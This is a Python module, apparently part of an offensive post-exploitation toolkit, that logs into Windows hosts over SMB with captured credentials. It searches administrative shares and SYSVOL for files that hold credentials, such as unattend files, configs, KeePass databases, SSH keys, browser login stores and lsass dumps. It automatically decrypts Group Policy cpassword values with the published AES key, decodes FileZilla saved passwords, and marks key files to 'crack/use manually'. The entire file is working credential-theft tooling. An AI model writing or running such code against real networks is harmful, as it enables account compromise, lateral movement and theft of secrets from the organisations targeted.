"""Phase 3 - file hunting over SMB (needs admin on the target for C$).

Walks a few high-value locations on the target's shares and flags files that
commonly hold credentials: unattend/sysprep, web.config and app configs, scripts,
KeePass DBs, SSH/cloud/git creds, GPP Groups.xml (with cpassword auto-decrypt),
SYSVOL logon scripts. Small text files are grepped for credential keywords; the
hit (and the file path) is reported so you can pull the full file.

Self-contained via impacket's SMBConnection. Fails gracefully (returns nothing)
if login fails or impacket is missing. Everything found is also summarised to the
raw output directory.
"""
from __future__ import annotations

import base64
import os
import re
from io import BytesIO
from typing import List, Tuple

from core.credential import Credential
from core.secret import Secret, Status
from .base import BaseCollector

MAX_FILE = 128 * 1024          # only read files up to 128 KB
MAX_HITS = 400                 # safety cap on total files inspected

INTERESTING = re.compile(
    r"(unattend\.xml|autounattend\.xml|sysprep\.(inf|xml)|web\.config|"
    r"applicationhost\.config|.*\.config|.*\.ps1|.*\.psm1|.*\.bat|.*\.cmd|.*\.vbs|"
    r".*\.kdbx|.*\.kdb|id_rsa|id_ed25519|id_dsa|.*\.ppk|\.git-credentials|"
    r"credentials|\.env|wp-config\.php|.*\.rdp|.*\.ini|groups\.xml|services\.xml|"
    r"scheduledtasks\.xml|datasources\.xml|.*\.ovpn|.*\.keepass|"
    r".*\.dmp|logins\.json|key4\.db|key3\.db|"
    r"signons\.sqlite|.*\.jks|.*\.pfx|.*\.p12|credentials\.xml|"
    r"recentservers\.xml|sitemanager\.xml|filezilla\.xml|superputty.*\.xml|"
    r"sessions\.xml)$", re.I)

CRED_KW = re.compile(
    r"(password|passwd|pwd|cpassword|secret|connectionstring|accountpassword|"
    r"-asplaintext|convertto-securestring|api[_-]?key|aws_secret|client_secret|"
    r"BEGIN [A-Z ]*PRIVATE KEY)", re.I)

# files we only report the path for (binary / pull-and-process offline)
# NB: registry hives (SAM/SYSTEM/SECURITY/NTDS.dit) are intentionally NOT hunted
# here - secretsdump already pulls those hashes, so flagging the files is noise.
BINARY_LOOT = re.compile(
    r"(\.kdbx|\.kdb|id_rsa|id_ed25519|id_dsa|\.ppk|\.keepass|\.dmp|\.jks|\.pfx|"
    r"\.p12|key4\.db|key3\.db|signons\.sqlite)$", re.I)

# (share, start_path, max_depth)
ROOTS: List[Tuple[str, str, int]] = [
    ("C$", "Windows\\Panther", 1),
    ("C$", "Windows\\System32\\sysprep", 1),
    ("C$", "Windows\\Temp", 1),                        # lsass.dmp etc.
    ("C$", "inetpub\\wwwroot", 3),
    ("C$", "Users", 4),
    ("C$", "Program Files\\Veeam", 2),
    ("C$", "Program Files\\Jenkins", 2),
    ("C$", "ProgramData\\Jenkins", 3),
    ("C$", "Program Files\\Update Services", 2),        # WSUS config
    ("C$", "Transcripts", 2),
    # locally cached GPP (survives after the GPO is deleted from SYSVOL) - holds
    # Groups.xml with cpassword; _scan auto-decrypts it like the SYSVOL copy
    ("C$", "ProgramData\\Microsoft\\Group Policy\\History", 6),
    ("SYSVOL", "", 5),
]

# Microsoft-published AES key for GPP cpassword (ms-DOCS, public)
GPP_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8"
    "f496e806cc057990209b09a433b66c1b")


def _decrypt_cpassword(cpassword: str) -> str:
    try:
        from Cryptodome.Cipher import AES
    except ImportError:
        try:
            from Crypto.Cipher import AES
        except ImportError:
            return ""
    try:
        pad = "=" * (-len(cpassword) % 4)
        data = base64.b64decode(cpassword + pad)
        iv = b"\x00" * 16
        pt = AES.new(GPP_KEY, AES.MODE_CBC, iv).decrypt(data)
        return pt[: -pt[-1]].decode("utf-16-le", errors="ignore")
    except Exception:
        return ""


class FileHuntCollector(BaseCollector):
    name = "FileHunt"
    description = "SMB file hunt: unattend/configs/scripts/keepass/ssh/GPP (needs admin)"
    per_credential = False
    needs_admin = True             # walks C$ (local admin required)
    requires = ()                  # uses impacket as a library, not a CLI

    def collect_once(self, cred: Credential) -> List[Secret]:
        try:
            from impacket.smbconnection import SMBConnection
        except ImportError:
            return []

        try:
            conn = SMBConnection(self.host, self.host, timeout=self.timeout)
            conn.login(cred.username, cred.password or "", cred.domain,
                       cred.lmhash or "", cred.nthash or "")
        except Exception:
            return []

        found: List[Secret] = []
        self._count = 0
        log = []
        try:
            for share, start, depth in ROOTS:
                try:
                    self._walk(conn, share, start, depth, found, log)
                except Exception as e:
                    log.append(f"[walk error] {share}\\{start}: {e}")
        finally:
            try:
                conn.logoff()
            except Exception:
                pass

        self._save_log(log)
        return found

    def _walk(self, conn, share, path, depth, found, log):
        if depth < 0 or self._count >= MAX_HITS:
            return
        try:
            entries = conn.listPath(share, (path + "\\*") if path else "*")
        except Exception:
            return
        for e in entries:
            name = e.get_longname()
            if name in (".", ".."):
                continue
            full = f"{path}\\{name}" if path else name
            if e.is_directory():
                self._walk(conn, share, full, depth - 1, found, log)
                continue
            if not INTERESTING.match(name):
                continue
            self._count += 1
            loc = f"\\\\{self.host}\\{share}\\{full}"
            if BINARY_LOOT.search(name):
                found.append(Secret(self.host, "FileHunt", "", loc, Status.INFO,
                                    secret_type="file",
                                    notes="key/DB file - pull & crack/use manually"))
                log.append(f"[binary] {loc}")
                continue
            if e.get_filesize() > MAX_FILE:
                found.append(Secret(self.host, "FileHunt", "", loc, Status.INFO,
                                    secret_type="file", notes="large config - review"))
                continue
            data = self._read(conn, share, full)
            if data is None:
                continue
            found += self._scan(data, loc, name, log)

    def _read(self, conn, share, path):
        try:
            buf = BytesIO()
            conn.getFile(share, path, buf.write)
            return buf.getvalue().decode("utf-8", errors="ignore")
        except Exception:
            return None

    def _scan(self, text, loc, name, log) -> List[Secret]:
        out = []
        # GPP cpassword -> decrypt
        for cm in re.finditer(r'cpassword="([^"]+)"', text):
            pw = _decrypt_cpassword(cm.group(1))
            un = re.search(r'userName="([^"]+)"', text)
            out.append(Secret(self.host, "FileHunt", un.group(1) if un else "",
                              pw or cm.group(1), Status.CLEARTEXT if pw else Status.INFO,
                              target=loc, secret_type="password",
                              notes="GPP cpassword" + ("" if pw else " (decrypt failed)")))
        # FileZilla saved sessions (<Pass encoding="base64">)
        for fm in re.finditer(
                r"<Host>([^<]*)</Host>.*?<User>([^<]*)</User>.*?"
                r'<Pass[^>]*encoding="base64"[^>]*>([^<]+)</Pass>', text, re.S | re.I):
            try:
                pw = base64.b64decode(fm.group(3)).decode("utf-8", "ignore")
            except Exception:
                pw = fm.group(3)
            out.append(Secret(self.host, "FileHunt", fm.group(2), pw, Status.CLEARTEXT,
                              target=fm.group(1), secret_type="password",
                              notes="FileZilla saved session"))
        # keyword lines
        hits = 0
        for ln in text.splitlines():
            if CRED_KW.search(ln) and hits < 5:
                out.append(Secret(self.host, "FileHunt", "", ln.strip()[:140],
                                  Status.INFO, target=loc, secret_type="file-hit",
                                  notes=f"in {name}"))
                hits += 1
        if out:
            log.append(f"[hit] {loc} ({len(out)})")
        return out

    def _save_log(self, log):
        try:
            os.makedirs(self.raw_dir, exist_ok=True)
            with open(os.path.join(self.raw_dir, "FileHunt.txt"), "w",
                      encoding="utf-8", errors="ignore") as fh:
                fh.write(f"# files inspected: {self._count}\n\n")
                fh.write("\n".join(log))
        except Exception:
            pass
